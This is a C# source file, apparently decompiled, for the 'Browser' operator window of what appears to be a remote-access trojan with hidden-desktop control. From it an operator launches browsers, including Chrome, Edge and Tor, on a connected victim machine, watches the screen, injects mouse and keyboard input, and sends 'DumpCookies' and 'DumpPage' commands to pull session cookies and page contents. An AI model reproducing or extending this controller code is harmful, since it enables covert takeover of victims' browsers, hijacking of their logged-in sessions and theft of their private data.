using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormBrowser : FormMaterial
{
	public Clients client;

	public Clients parrent;

	public Size screen;

	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	public bool IsCapture;

	private IContainer components;

	public PictureBox pictureBox1;

	public MaterialSwitch materialSwitch1;

	private Panel panel1;

	public RJComboBox rjComboBox2;

	public RJComboBox rjComboBox1;

	public Timer timer1;

	private RJButton rjButton1;

	private RJButton rjButton2;

	private RJButton rjButton3;

	private RJButton rjButton4;

	public FormBrowser()
	{
		InitializeComponent();
	}

	private void FormBrowser_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		rjComboBox1.Items.AddRange(new object[8] { "Chrome", "Firefox", "Edge", "Opera", "OperaGX", "Brave", "Yandex", "Tor" });
		rjComboBox1.SelectedIndex = 0;
		base.KeyPreview = false;
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (isDark ? Color.FromArgb(40, 40, 40) : Color.White);
		Color editBack = (isDark ? Color.FromArgb(40, 40, 40) : Color.White);
		Color text = (isDark ? Color.White : Color.Black);
		BackColor = back;
		panel1.BackColor = back;
		pictureBox1.BackColor = (isDark ? Color.FromArgb(30, 30, 30) : Color.White);
		rjComboBox1.BorderColor = primary;
		rjComboBox1.IconColor = primary;
		rjComboBox1.BackColor = editBack;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = editBack;
		rjComboBox1.ListTextColor = text;
		rjComboBox2.BorderColor = primary;
		rjComboBox2.IconColor = primary;
		rjComboBox2.BackColor = editBack;
		rjComboBox2.ForeColor = text;
		rjComboBox2.ListBackColor = editBack;
		rjComboBox2.ListTextColor = text;
		rjButton1.BackColor = primary;
		rjButton1.BackgroundColor = primary;
		rjButton1.ForeColor = Color.White;
		rjButton2.BackColor = primary;
		rjButton2.BackgroundColor = primary;
		rjButton2.ForeColor = Color.White;
		rjButton3.BackColor = primary;
		rjButton3.BackgroundColor = primary;
		rjButton3.ForeColor = Color.White;
		rjButton4.BackColor = primary;
		rjButton4.BackgroundColor = primary;
		rjButton4.ForeColor = Color.White;
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (materialSwitch1.Checked)
		{
			if (client != null)
			{
				IsCapture = true;
				client.Send(LEB128.Write(new object[3]
				{
					"Capture",
					true,
					(byte)100
				}));
				client.Send(LEB128.Write(new object[1] { "GetTabs" }));
			}
		}
		else if (client != null)
		{
			IsCapture = false;
			client.Send(LEB128.Write(new object[2] { "Capture", false }));
		}
	}

	private void rjComboBox2_OnSelectedIndexChanged(object sender, EventArgs e)
	{
		if (client == null || rjComboBox2.SelectedItem == null)
		{
			return;
		}
		try
		{
			string selected = rjComboBox2.SelectedItem.ToString();
			if (selected.Contains("[") && selected.Contains("]"))
			{
				long hwnd = long.Parse(selected.Split('[', ']')[1]);
				client.Send(LEB128.Write(new object[2] { "SetTarget", hwnd }));
			}
		}
		catch
		{
		}
	}

	private async void rjButton1_Click(object sender, EventArgs e)
	{
		if (client != null && rjComboBox1.SelectedItem != null)
		{
			string browser = rjComboBox1.SelectedItem.ToString();
			if (rjComboBox2.Items.Count > 1)
			{
				client.Send(LEB128.Write(new object[3] { "KeyboardClick", true, 17 }));
				client.Send(LEB128.Write(new object[3] { "KeyboardClick", true, 84 }));
				client.Send(LEB128.Write(new object[3] { "KeyboardClick", false, 84 }));
				client.Send(LEB128.Write(new object[3] { "KeyboardClick", false, 17 }));
			}
			else
			{
				client.Send(LEB128.Write(new object[2] { "Run", browser }));
			}
			await Task.Delay(2000);
			client.Send(LEB128.Write(new object[1] { "GetTabs" }));
		}
	}

	private async void rjButton2_Click(object sender, EventArgs e)
	{
		if (client != null && rjComboBox2.SelectedItem != null && rjComboBox2.SelectedItem.ToString() != "Main Desktop")
		{
			client.Send(LEB128.Write(new object[1] { "CloseTarget" }));
			await Task.Delay(1000);
			client.Send(LEB128.Write(new object[1] { "GetTabs" }));
		}
	}

	private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (client != null && IsCapture)
		{
			int x = e.X * screen.Width / pictureBox1.Width;
			int y = e.Y * screen.Height / pictureBox1.Height;
			byte button = 0;
			if (e.Button == MouseButtons.Left)
			{
				button = 2;
			}
			if (e.Button == MouseButtons.Right)
			{
				button = 8;
			}
			if (button != 0)
			{
				client.Send(LEB128.Write(new object[4] { "MouseClick", button, x, y }));
			}
		}
	}

	private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		if (client != null && IsCapture)
		{
			int x = e.X * screen.Width / pictureBox1.Width;
			int y = e.Y * screen.Height / pictureBox1.Height;
			byte button = 0;
			if (e.Button == MouseButtons.Left)
			{
				button = 4;
			}
			if (e.Button == MouseButtons.Right)
			{
				button = 16;
			}
			if (button != 0)
			{
				client.Send(LEB128.Write(new object[4] { "MouseClick", button, x, y }));
			}
		}
	}

	private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		if (client != null && IsCapture)
		{
			int x = e.X * screen.Width / pictureBox1.Width;
			int y = e.Y * screen.Height / pictureBox1.Height;
			client.Send(LEB128.Write(new object[3] { "MouseMove", x, y }));
		}
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
		pictureBox1.Focus();
	}

	private void pictureBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
	{
		e.IsInputKey = true;
	}

	private void pictureBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (client != null && IsCapture)
		{
			if (e.Alt && e.Shift)
			{
				client.Send(LEB128.Write(new object[1] { "ChangeLanguage" }));
			}
			client.Send(LEB128.Write(new object[3]
			{
				"KeyboardClick",
				true,
				(int)e.KeyCode
			}));
		}
	}

	private void pictureBox1_KeyUp(object sender, KeyEventArgs e)
	{
		if (client != null && IsCapture)
		{
			client.Send(LEB128.Write(new object[3]
			{
				"KeyboardClick",
				false,
				(int)e.KeyCode
			}));
		}
	}

	private void rjButton4_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[1] { "DumpPage" }));
		}
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[1] { "DumpCookies" }));
		}
	}

	private void FormBrowser_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (client != null)
		{
			client.Send(LEB128.Write(new object[2] { "Capture", false }));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.panel1 = new System.Windows.Forms.Panel();
		this.rjComboBox1 = new CustomControls.RJControls.RJComboBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.rjComboBox2 = new CustomControls.RJControls.RJComboBox();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjButton4 = new CustomControls.RJControls.RJButton();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.BackColor = System.Drawing.Color.White;
		this.pictureBox1.Location = new System.Drawing.Point(3, 43);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(906, 474);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 25;
		this.pictureBox1.TabStop = false;
		this.pictureBox1.Click += new System.EventHandler(pictureBox1_Click);
		this.pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseDown);
		this.pictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseMove);
		this.pictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseUp);
		this.pictureBox1.PreviewKeyDown += new System.Windows.Forms.PreviewKeyDownEventHandler(pictureBox1_PreviewKeyDown);
		this.pictureBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(pictureBox1_KeyDown);
		this.pictureBox1.KeyUp += new System.Windows.Forms.KeyEventHandler(pictureBox1_KeyUp);
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(0, 3);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 21;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.rjButton3);
		this.panel1.Controls.Add(this.rjButton4);
		this.panel1.Controls.Add(this.rjButton2);
		this.panel1.Controls.Add(this.rjButton1);
		this.panel1.Controls.Add(this.rjComboBox2);
		this.panel1.Controls.Add(this.pictureBox1);
		this.panel1.Controls.Add(this.rjComboBox1);
		this.panel1.Controls.Add(this.materialSwitch1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.ForeColor = System.Drawing.Color.Black;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(914, 520);
		this.panel1.TabIndex = 27;
		this.rjComboBox1.BackColor = System.Drawing.SystemColors.Window;
		this.rjComboBox1.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.BorderSize = 1;
		this.rjComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox1.ForeColor = System.Drawing.Color.Black;
		this.rjComboBox1.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox1.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox1.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBox1.Location = new System.Drawing.Point(107, 7);
		this.rjComboBox1.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox1.Name = "rjComboBox1";
		this.rjComboBox1.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox1.Size = new System.Drawing.Size(232, 30);
		this.rjComboBox1.TabIndex = 24;
		this.rjComboBox1.Texts = "";
		this.timer1.Interval = 1000;
		this.rjComboBox2.BackColor = System.Drawing.SystemColors.Window;
		this.rjComboBox2.BorderColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.BorderSize = 1;
		this.rjComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDown;
		this.rjComboBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.rjComboBox2.ForeColor = System.Drawing.Color.Black;
		this.rjComboBox2.IconColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjComboBox2.ListBackColor = System.Drawing.Color.White;
		this.rjComboBox2.ListTextColor = System.Drawing.Color.Black;
		this.rjComboBox2.Location = new System.Drawing.Point(345, 7);
		this.rjComboBox2.MinimumSize = new System.Drawing.Size(200, 30);
		this.rjComboBox2.Name = "rjComboBox2";
		this.rjComboBox2.Padding = new System.Windows.Forms.Padding(1);
		this.rjComboBox2.Size = new System.Drawing.Size(232, 30);
		this.rjComboBox2.TabIndex = 26;
		this.rjComboBox2.Texts = "";
		this.rjComboBox2.OnSelectedIndexChanged += new System.EventHandler(rjComboBox2_OnSelectedIndexChanged);
		this.rjButton1.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton1.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton1.BorderRadius = 0;
		this.rjButton1.BorderSize = 0;
		this.rjButton1.FlatAppearance.BorderSize = 0;
		this.rjButton1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton1.Font = new System.Drawing.Font("Arial", 9f);
		this.rjButton1.ForeColor = System.Drawing.Color.White;
		this.rjButton1.Location = new System.Drawing.Point(583, 7);
		this.rjButton1.Name = "rjButton1";
		this.rjButton1.Size = new System.Drawing.Size(39, 31);
		this.rjButton1.TabIndex = 27;
		this.rjButton1.Text = "+";
		this.rjButton1.TextColor = System.Drawing.Color.White;
		this.rjButton1.UseVisualStyleBackColor = false;
		this.rjButton1.Click += new System.EventHandler(rjButton1_Click);
		this.rjButton2.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton2.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton2.BorderRadius = 0;
		this.rjButton2.BorderSize = 0;
		this.rjButton2.FlatAppearance.BorderSize = 0;
		this.rjButton2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton2.Font = new System.Drawing.Font("Arial", 9f);
		this.rjButton2.ForeColor = System.Drawing.Color.White;
		this.rjButton2.Location = new System.Drawing.Point(628, 7);
		this.rjButton2.Name = "rjButton2";
		this.rjButton2.Size = new System.Drawing.Size(39, 31);
		this.rjButton2.TabIndex = 28;
		this.rjButton2.Text = "-";
		this.rjButton2.TextColor = System.Drawing.Color.White;
		this.rjButton2.UseVisualStyleBackColor = false;
		this.rjButton2.Click += new System.EventHandler(rjButton2_Click);
		this.rjButton4.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton4.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton4.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton4.BorderRadius = 0;
		this.rjButton4.BorderSize = 0;
		this.rjButton4.FlatAppearance.BorderSize = 0;
		this.rjButton4.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton4.Font = new System.Drawing.Font("Arial", 9f);
		this.rjButton4.ForeColor = System.Drawing.Color.White;
		this.rjButton4.Location = new System.Drawing.Point(673, 7);
		this.rjButton4.Name = "rjButton4";
		this.rjButton4.Size = new System.Drawing.Size(115, 31);
		this.rjButton4.TabIndex = 49;
		this.rjButton4.Text = "Dump Page";
		this.rjButton4.TextColor = System.Drawing.Color.White;
		this.rjButton4.UseVisualStyleBackColor = false;
		this.rjButton4.Click += new System.EventHandler(rjButton4_Click);
		this.rjButton3.BackColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BackgroundColor = System.Drawing.Color.FromArgb(192, 0, 192);
		this.rjButton3.BorderColor = System.Drawing.Color.PaleVioletRed;
		this.rjButton3.BorderRadius = 0;
		this.rjButton3.BorderSize = 0;
		this.rjButton3.FlatAppearance.BorderSize = 0;
		this.rjButton3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.rjButton3.Font = new System.Drawing.Font("Arial", 9f);
		this.rjButton3.ForeColor = System.Drawing.Color.White;
		this.rjButton3.Location = new System.Drawing.Point(794, 7);
		this.rjButton3.Name = "rjButton3";
		this.rjButton3.Size = new System.Drawing.Size(115, 31);
		this.rjButton3.TabIndex = 50;
		this.rjButton3.Text = "Dump Cookies";
		this.rjButton3.TextColor = System.Drawing.Color.White;
		this.rjButton3.UseVisualStyleBackColor = false;
		this.rjButton3.Click += new System.EventHandler(rjButton3_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(920, 587);
		base.Controls.Add(this.panel1);
		base.Name = "FormBrowser";
		this.Text = "Browser";
		base.Load += new System.EventHandler(FormBrowser_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
